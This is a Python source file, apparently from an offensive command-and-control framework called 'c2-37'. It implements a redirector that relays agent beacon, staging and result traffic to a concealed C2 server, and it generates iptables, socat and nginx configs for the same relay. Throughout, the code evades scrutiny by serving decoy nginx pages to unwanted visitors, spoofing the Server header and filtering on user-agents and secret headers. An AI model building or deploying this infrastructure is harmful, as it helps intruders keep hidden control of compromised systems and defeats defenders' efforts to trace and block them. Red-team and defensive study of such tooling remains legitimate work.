"""c2-37 redirector — traffic redirection for OPSEC.

Redirectors sit between agents and the C2 server.
They forward C2 traffic while appearing as legitimate web servers.
If burned, replace the redirector — C2 server stays hidden.
"""
from __future__ import annotations

import json
import socket
import ssl
import threading
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional


class Redirector:
    """HTTP redirector that proxies traffic to the real C2 server.

    Sits between agents and the C2 server for OPSEC.
    Agents connect to the redirector, which forwards to C2.
    Can filter traffic and block unwanted requests.
    """

    def __init__(self, listen_port: int = 80, c2_host: str = "127.0.0.1",
                 c2_port: int = 8037, ssl_cert: str = None, ssl_key: str = None):
        self.listen_port = listen_port
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.ssl_cert = ssl_cert
        self.ssl_key = ssl_key
        self._server: Optional[HTTPServer] = None
        self._running = False

        # Filtering
        self.allowed_uas: list[str] = []  # allowed user-agents (empty = all)
        self.blocked_ips: set[str] = set()
        self.require_header: Optional[tuple[str, str]] = None  # (header, value)

    def _make_handler(redirector_ref):
        class RedirectHandler(BaseHTTPRequestHandler):
            redir = redirector_ref

            def log_message(self, format, *args):
                pass

            def _should_block(self) -> bool:
                """Check if this request should be blocked."""
                client_ip = self.client_address[0]
                if client_ip in self.redir.blocked_ips:
                    return True

                ua = self.headers.get("User-Agent", "")
                if self.redir.allowed_uas and not any(a in ua for a in self.redir.allowed_uas):
                    return True

                if self.redir.require_header:
                    h_name, h_val = self.redir.require_header
                    if self.headers.get(h_name) != h_val:
                        return True

                return False

            def _serve_decoy(self):
                """Serve a decoy page to non-C2 traffic."""
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Server", "Apache/2.4.54 (Ubuntu)")
                self.end_headers()
                self.wfile.write(b"""<!DOCTYPE html>
<html><head><title>Welcome to nginx!</title>
<style>body{width:35em;margin:0 auto;font-family:Tahoma,Verdana,Arial,sans-serif}</style>
</head><body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and working.</p>
</body></html>""")

            def _forward(self, method: str):
                """Forward request to real C2 server."""
                if self._should_block():
                    self._serve_decoy()
                    return

                # Read request body
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length) if length else None

                # Forward to C2
                c2_url = f"http://{self.redir.c2_host}:{self.redir.c2_port}{self.path}"
                try:
                    req = urllib.request.Request(
                        c2_url,
                        data=body,
                        method=method,
                    )
                    # Copy relevant headers
                    for header in ["Content-Type", "User-Agent"]:
                        val = self.headers.get(header)
                        if val:
                            req.add_header(header, val)

                    with urllib.request.urlopen(req, timeout=10) as resp:
                        resp_body = resp.read()
                        self.send_response(resp.status)
                        for header, val in resp.getheaders():
                            if header.lower() not in ("transfer-encoding", "connection"):
                                self.send_header(header, val)
                        # Spoof server header
                        self.send_header("Server", "Apache/2.4.54 (Ubuntu)")
                        self.end_headers()
                        self.wfile.write(resp_body)

                except Exception:
                    self._serve_decoy()

            def do_GET(self):
                self._forward("GET")

            def do_POST(self):
                self._forward("POST")

        return RedirectHandler

    def start(self, background: bool = True):
        handler = Redirector._make_handler(self)
        self._server = HTTPServer(("0.0.0.0", self.listen_port), handler)

        if self.ssl_cert and self.ssl_key:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(self.ssl_cert, self.ssl_key)
            self._server.socket = ctx.wrap_socket(self._server.socket, server_side=True)

        self._running = True
        if background:
            t = threading.Thread(target=self._server.serve_forever, daemon=True)
            t.start()
        else:
            self._server.serve_forever()

    def stop(self):
        self._running = False
        if self._server:
            self._server.shutdown()

    def to_json(self) -> dict:
        return {
            "type": "redirector",
            "listen_port": self.listen_port,
            "c2_host": self.c2_host,
            "c2_port": self.c2_port,
            "tls": bool(self.ssl_cert),
            "running": self._running,
            "blocked_ips": list(self.blocked_ips),
            "allowed_uas": self.allowed_uas,
        }


def generate_iptables_redirector(listen_port: int, c2_ip: str, c2_port: int) -> str:
    """Generate iptables rules for a transparent redirector."""
    return f"""#!/bin/bash
# c2-37 iptables redirector
# Run on the redirector VPS

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect incoming traffic on port {listen_port} to C2
iptables -t nat -A PREROUTING -p tcp --dport {listen_port} -j DNAT --to-destination {c2_ip}:{c2_port}
iptables -t nat -A POSTROUTING -j MASQUERADE

# To undo:
# iptables -t nat -D PREROUTING -p tcp --dport {listen_port} -j DNAT --to-destination {c2_ip}:{c2_port}
# iptables -t nat -D POSTROUTING -j MASQUERADE
"""


def generate_socat_redirector(listen_port: int, c2_ip: str, c2_port: int) -> str:
    """Generate socat command for a simple redirector."""
    return f"socat TCP-LISTEN:{listen_port},fork,reuseaddr TCP:{c2_ip}:{c2_port}"


def generate_nginx_redirector(listen_port: int, c2_ip: str, c2_port: int,
                               domain: str = "legit-site.com") -> str:
    """Generate nginx config for an HTTPS redirector."""
    return f"""# c2-37 nginx redirector config
# Place at /etc/nginx/sites-available/c2-redir

server {{
    listen {listen_port} ssl;
    server_name {domain};

    ssl_certificate /etc/letsencrypt/live/{domain}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{domain}/privkey.pem;

    # Only proxy specific paths, serve decoy for everything else
    location ~ ^/(register|beacon|result|stage|api/) {{
        proxy_pass http://{c2_ip}:{c2_port};
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }}

    # Decoy site for everything else
    location / {{
        root /var/www/html;
        index index.html;
    }}
}}
"""
